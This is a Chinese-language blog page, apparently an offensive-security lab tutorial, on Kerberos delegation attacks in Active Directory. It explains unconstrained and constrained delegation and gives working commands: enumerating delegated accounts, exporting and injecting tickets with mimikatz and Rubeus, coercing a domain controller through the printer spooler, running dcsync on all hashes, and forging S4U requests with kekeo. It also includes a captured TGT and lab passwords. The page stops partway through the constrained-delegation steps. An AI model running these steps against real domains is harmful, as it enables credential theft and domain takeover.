@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01委派委派：当用户A基于kerberos验证去请求B服务，B服务使用A的身份去请求服务C。   域内用户jack以Kerberos方式认证后访问Web服务器； Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请； KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT； websvc收到jack用户TGT后，使用该票据向KDC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kerberos委派">
+<meta property="og:url" content="http://example.com/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/index.html">
+<meta property="og:site_name" content="我是GG还是MM">
+<meta property="og:description" content="0x01委派委派：当用户A基于kerberos验证去请求B服务，B服务使用A的身份去请求服务C。   域内用户jack以Kerberos方式认证后访问Web服务器； Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请； KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT； websvc收到jack用户TGT后，使用该票据向KDC">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png">
+<meta property="og:image" content="https://i0.hdslb.com/bfs/album/046165a912020139ef3627d3712e81356486aa64.png">
+<meta property="og:image" content="https://i0.hdslb.com/bfs/album/e698c913d416928b7803875cd9d75675cbd745ac.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6jr7.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6FzF.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6Rir.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6xqJ.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6Tx0.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXIzwN.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXIEBs.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXIYJ7.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wXIwmG.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wXIfay.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wXIGaM.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wXIHEt.png">
+<meta property="article:published_time" content="2021-10-03T13:33:37.000Z">
+<meta property="article:modified_time" content="2021-10-03T16:37:22.570Z">
+<meta property="article:author" content="1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/10/03/kerberos委派/"/>
+
+
+
+
+
+  <title>kerberos委派 | 我是GG还是MM</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">我是GG还是MM</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是GG还是MM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">kerberos委派</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-03T21:33:37+08:00">
+                2021-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x01委派"><a href="#0x01委派" class="headerlink" title="0x01委派"></a>0x01委派</h1><p>委派：当用户A基于kerberos验证去请求B服务，B服务使用A的身份去请求服务C。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png"></p>
+<ul>
+<li>域内用户jack以Kerberos方式认证后访问Web服务器；</li>
+<li>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；</li>
+<li>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT；</li>
+<li>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；</li>
+<li>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；</li>
+<li>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</li>
+</ul>
+<p>在域内只有<strong>服务账号</strong>和<strong>机器账号</strong>才具有委派属性。</p>
+<p><strong>机器账号</strong>就是AD活动目录中 Computers 中的计算机(一个普通域用户默认最多可以创建十个主机账号)。</p>
+<p><strong>服务账号</strong>（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册SPN变为服务账号。</p>
+<p>当用户被设置为不允许被委派，那么就不能委派。</p>
+<p><img src="https://i0.hdslb.com/bfs/album/046165a912020139ef3627d3712e81356486aa64.png"></p>
+<p>委派可以分为：</p>
+<p><strong>非约束性委派</strong></p>
+<p><strong>约束性委派</strong></p>
+<p><strong>基于资源的约束委派</strong></p>
+<h2 id="0x02-非约束委派"><a href="#0x02-非约束委派" class="headerlink" title="0x02 非约束委派"></a>0x02 非约束委派</h2><p>操作环境：</p>
+<blockquote>
+<p>域：redteam.local</p>
+<p>域控：DC.redteam.local。主机名：DC。ip：192.168.11.16</p>
+<p>域管账户：Administrator/test123..</p>
+<p>域内机器：MSSQL.redteam。ip：192.168.11.8。普通账户：hack/test123..</p>
+</blockquote>
+<p><strong>前提：</strong>在机器账号B上配置了非约束性委派(域管理员才有权限配置)</p>
+<p>1.用户访问机器B的某个服务，于是向KDC认证。KDC会检查机器B的机器账号的属性，发现是非约束性委派，KDC会将用户的TGT放在ST服务票据中。</p>
+<p>2.用户访问机器B时，TGT票据会和ST服务票据一同发送给机器B</p>
+<p>3.这样B在验证ST服务票据的同时获取了用户的TGT，并将TGT存储在LSASS进程中，从而可以模拟用户访问任意服务</p>
+<p>从网络攻击的角度来看，如果攻击者控制了机器B的机器账号，并且机器B配置了非约束性委派。则攻击者可以诱骗管理员来访问机器B，然后攻击者可以获取管理员的TGT，从而模拟管理员访问任意服务，即获得了管理员权限。</p>
+<p>在非约束行委派中，服务账号可以获取被委派用户的TGT，然后把TGT存储在LSASS进程中，从而服务账号可以使用这个TGT去模拟用户访问任何服务。</p>
+<p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>WORKSTATION_TRUSTED_FOR_DELEGATION</code>。我们设置MSSQL这个机器。</p>
+<p><img src="https://i0.hdslb.com/bfs/album/e698c913d416928b7803875cd9d75675cbd745ac.png"></p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6jr7.png" alt="wX6jr7.png"></p>
+<p>当我们控制了机器账号MSSQL，然后诱导管理员来访问机器，就可以获得管理员的TGT，从而访问任何服务。</p>
+<h3 id="2-1-筛选非约束性委派的账号"><a href="#2-1-筛选非约束性委派的账号" class="headerlink" title="2.1 筛选非约束性委派的账号"></a>2.1 筛选非约束性委派的账号</h3><p>域控主机账户是默认开启非约束性委派</p>
+<h4 id="2-1-1-powerview-ps1"><a href="#2-1-1-powerview-ps1" class="headerlink" title="2.1.1 powerview.ps1"></a>2.1.1 powerview.ps1</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"> </span><br><span class="line">查询域中配置非约束委派的账户</span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br><span class="line">查询域中配置非约束委派的主机：</span><br><span class="line"><span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\Desktop&gt; <span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br><span class="line">DC.redteam.local</span><br><span class="line">mssql.redteam.local</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-1-2-ADFind"><a href="#2-1-2-ADFind" class="headerlink" title="2.1.2 ADFind"></a>2.1.2 ADFind</h4><p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"></span><br><span class="line">AdFind V01.56.00cpp Joe Richards (support@joeware.net) April 2021</span><br><span class="line"></span><br><span class="line">Using server: DC.redteam.local:389</span><br><span class="line">Directory: Windows Server 2016</span><br><span class="line"></span><br><span class="line">dn:CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line">&gt;cn: DC</span><br><span class="line">&gt;distinguishedName: CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">dn:CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line">&gt;cn: MSSQL</span><br><span class="line">&gt;distinguishedName: CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2 Objects returned</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-1-3-ldapsearch"><a href="#2-1-3-ldapsearch" class="headerlink" title="2.1.3 ldapsearch"></a>2.1.3 ldapsearch</h4><p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">distinguishedName: CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line">distinguishedName: CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─#</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-2-非约束性委派攻击"><a href="#2-2-非约束性委派攻击" class="headerlink" title="2.2 非约束性委派攻击"></a>2.2 非约束性委派攻击</h3><p>我们在mssql这台机器访问域控。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6FzF.png" alt="wX6FzF.png"></p>
+<p>可以看到是访问是拒绝的。然后我们用域管账户去访问MSSQL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;dir \\MSSQL.redteam.local\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个时候在MSSQL这台机器的lsass.exe内存中会存在域管administrator账户的TGT票据。然后在MSSQL机器运行mimikatz。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">导出票据</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6Rir.png" alt="wX6Rir.png"></p>
+<p>然后再注入票据到内存里面，再访问域控。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">导入票据</span><br><span class="line">kerberos::ptt xxx.kirbi</span><br><span class="line">查看票据</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6xqJ.png" alt="wX6xqJ.png"></p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6Tx0.png" alt="wX6Tx0.png"></p>
+<h3 id="2-3-非约束性委派配合打印机"><a href="#2-3-非约束性委派配合打印机" class="headerlink" title="2.3 非约束性委派配合打印机"></a>2.3 非约束性委派配合打印机</h3><p>默认情况下Spooler服务是自动开启的。</p>
+<p>使用本地管理员身份运行Rubeus来监听事件id为4624的事件，然后时间设置为1秒，可以截取到域控的TGT。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br></pre></td></tr></table></figure>
+
+<p>然通过SpoolSample.exe向域控发起请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC MSSQL</span><br></pre></td></tr></table></figure>
+
+<p>Rubeus成功接受到了TGT</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIzwN.png" alt="wXIzwN.png"></p>
+<p>复制监听到的TGT的base64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doIE+jCCBPagAwIBBaEDAgEWooIEETCCBA1hggQJMIIEBaADAgEFoQ8bDVJFRFRFQU0uTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDVJFRFRFQU0uTE9DQUyjggPHMIIDw6ADAgEXoQMCAQKiggO1BIIDsTRd7H8nT8n2+xhFjdYxWkeGwWptrnyKLgxn746x3g+68Wa92RV8mkudwvNSHPEbhA05tXVs62KwV/TjlhSHcjW9U8KfzgGdJpcpF8JrbW+X0ON4J0SyuwtcubsOiulJ6yiyH4riFlMTcl6TXMdbWCnOwIriPfOnQP/jtkcZWx2J27Y2HZ8cCAL00aV14S+ajcA65Howkx1/0ts+YQVZhFpc6l9fFQfGp9R87CjPNpWXEJV0iUGSELptTfXTxNSr/oF3+G7U0KrNl+9NMjloU6tFy/gnmc1PbDnUNXYgdKssUvxUpBzfVxq7leBkX1chx91kPcRrqAZC+tUWSoyULTkCPB8OcYY2DwHy4ElaQbo3y1mmq2DtHTx/ulGvwfKbpQrDgVSKZjE7VGdQSD7eAUJB7Pbu+lHsPc30DLVIbxJEQlC7WRKi1tNc6mhQJtAEGQFUUdYSQNtvNpiphZEfNGUoPaTz/9QspD9jjyVv+Dm7lqup5ojDSAxxc0Gzg61c4KmW3pJlmVQaN4f9Of+LeuqR3tR5EWxPqmkTgv1eVwdGryiF0cNC5Q7SAxrr6mgL2pL2HpMMILwhLSWlk0YIt6qdlyhRRdBzgopSzN5yB3IkSK4RXAF4CFYbximorzkIa9jG34ge9FlSVRkjUxNXb5KnCTDhLymT3F3tJeZoGig4Q+O9pfuUutsuxzSsy8u6xuuXkvg//LuXvDDOuVbOuKHR05tPfc1f9nKqs/YclidoYN3Nf/51pgF4n0ZXieHu5hgZYhb//qKh1X51ezI0MQ1gwkmssF9724s0U1QcLIS4ts3XxPCaDfuOeOLJUoMyqt0BdvYdVn6uGl0b2kCYwtk8ouIfuBbGeSYyGcSo+//tyTNJL57TCy42wRkFecRDdsBrRP8Je46fHBDPp7dhfOwP29Yt4nHFEtCKmjNeYLKQmQnKJ2i4AJKkOyi3QYPcf8Q+uzgU8c5V4p8kj+YBtvUMKQx6Dy1+MTfFz3tY1pQ7KB2pHziop/mm1f6ZPXNtoqcrtlCL+YGDEtgAPxSqaf3eAUhXar39qpUV1ey2Y7Pv/NZg8NevdUUG83LVXIiHHbwGTPBQgccrg9qC0cGHEHs0TNy7cLKc/8s86ZCzvBffmp/Q77QKZIH6jwvxopDjnO0s5jE9F7DVqBK51AWtPuSufXbOTqNMih90jxDJrb9cOZsIqadS7K6fJK232uUHCqSBP4H7QORFRPsCV6YFR13uzFutz+zN59+Y76NUrmhkqqOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEFo/U0fj+283YVzNrDWB7b+hDxsNUkVEVEVBTS5MT0NBTKIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAYKEAAKURGA8yMDIxMTAwMzEyNDAzMlqmERgPMjAyMTEwMDMyMjQwMjlapxEYDzIwMjExMDEwMTI0MDI5WqgPGw1SRURURUFNLkxPQ0FMqSIwIKADAgECoRkwFxsGa3JidGd0Gw1SRURURUFNLkxPQ0FM</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再Rubeus导入base64的票据直接注入进内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:base64</span><br></pre></td></tr></table></figure>
+
+<p>可以klist看到票据已经导入成功</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIEBs.png" alt="wXIEBs.png"></p>
+<p>然后就可以直接dcsync</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:redteam.local /all /csv</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIYJ7.png" alt="wXIYJ7.png"></p>
+<h2 id="0x03-约束性委派"><a href="#0x03-约束性委派" class="headerlink" title="0x03 约束性委派"></a>0x03 约束性委派</h2><p>操作环境：</p>
+<blockquote>
+<p>域：redteam.local</p>
+<p>域控：DC.redteam.local。主机名：DC。ip：192.168.11.16</p>
+<p>域管账户：Administrator/test123..</p>
+<p>域内机器：MSSQL.redteam。ip：192.168.11.8。普通账户：hack/test123..</p>
+</blockquote>
+<p><strong>前提：</strong>在服务A上配置到服务B约束性委派(域管理员才有权限配置)</p>
+<p>1.用户访问服务A，于是向域控进行kerberos认证，域控返回ST1服务票据给用户，用户使用此服务票据访问服务A</p>
+<p>2.若该服务A允许委派给服务B，则A能使用S4U2Proxy协议将用户发送给自己的可转发的ST1服务票据以用户的身份再转发给域控制器。于是域控返回给服务A一个ST2服务票据，</p>
+<p>3.服务A便能使用获得的ST2服务票据以用户的身份访问服务B。</p>
+<p>从网络攻击的角度来看，如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。则攻击者可以利用服务A以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p>
+<p>在kerberos协议里面存在两个拓展子协议S4u2seflt和S4u2Proxy。服务账号只能获取用户的TGS，这个时候就只能模拟用户访问特定的服务。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIwmG.png" alt="wXIwmG.png"></p>
+<p>当被配置了约束委派的账户的userAccountControl属性有个FLAG位 TRUSTED_TO_AUTH_FOR_DELEGATION，并且msDS-AllowedToDelegateTo 属性还会指定对哪个SPN进行委派。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIfay.png" alt="wXIfay.png"></p>
+<h3 id="3-1-筛选约束性委派账号"><a href="#3-1-筛选约束性委派账号" class="headerlink" title="3.1 筛选约束性委派账号"></a>3.1 筛选约束性委派账号</h3><h4 id="3-1-1-ldapsearch"><a href="#3-1-1-ldapsearch" class="headerlink" title="3.1.1 ldapsearch"></a>3.1.1 ldapsearch</h4><p>查找域中配置约束委派用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查找域中配置约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-1-2-FuckLdap"><a href="#3-1-2-FuckLdap" class="headerlink" title="3.1.2 FuckLdap"></a>3.1.2 FuckLdap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FuckLdap.exe -d 192.168.11.16 -u hack -p test123.. --Checkdelegation</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIGaM.png" alt="wXIGaM.png"></p>
+<h3 id="3-2-约束性委派攻击"><a href="#3-2-约束性委派攻击" class="headerlink" title="3.2 约束性委派攻击"></a>3.2 约束性委派攻击</h3><p>我们这里设置了MSSQL这个机器用户对DC的cifs服务的委派。</p>
+<p>当我们要进行约束委派攻击的前提就是拿到这台启用了约束委派的机器权限。</p>
+<p><strong>生成TGT</strong></p>
+<p>首先生成TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:MSSQL$ /domain:redteam.local /NTLM:29de42b31e2b7961fda4fbe648d062c9&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获得ST</strong></p>
+<p>使用这张TGT通过伪造s4U请求以administrator用户身份请求去访问DC的cifs的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_MSSQL$@REDTEAM.LOCAL_krbtgt~redteam.local@REDTEAM.LOCAL.kirbi /user:Administrator@redteam.local /service:cifs/DC.redteam.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的DC CIFS服务的ST2会保存在当前目录下</p>
+<p><strong>注入ST2</strong></p>
